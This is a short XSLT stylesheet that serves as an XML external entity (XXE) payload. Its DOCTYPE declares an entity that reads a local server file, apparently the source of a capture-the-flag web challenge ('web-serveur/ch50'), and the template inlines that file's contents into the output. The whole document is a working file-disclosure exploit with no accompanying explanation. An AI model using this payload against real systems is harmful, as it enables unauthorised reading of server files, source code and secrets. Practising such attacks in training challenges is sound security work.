<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///challenge/web-serveur/ch50/index.php">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 <html>
 <body>
<data><ID>&file;</ID></data>
 </body>
 </html>
</xsl:template>
</xsl:stylesheet>
